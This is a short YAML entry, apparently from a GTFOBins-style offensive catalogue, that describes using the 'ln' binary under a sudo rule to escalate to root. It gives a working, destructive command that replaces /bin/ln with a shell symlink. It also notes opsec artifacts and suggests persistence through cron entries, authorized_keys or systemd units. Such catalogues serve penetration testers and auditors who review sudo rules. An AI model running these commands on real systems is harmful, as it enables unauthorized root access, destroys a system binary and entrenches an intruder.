---
name: ln
capabilities:
- exec
- suid
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: privilege-escalation
  description: Escalate to root via this binary.
  capabilities:
  - exec
  - suid
  command: |-
    ln -fs /bin/sh /bin/ln
    ln
  notes: This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.
references:
- https://gtfobins.github.io/gtfobins/ln/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
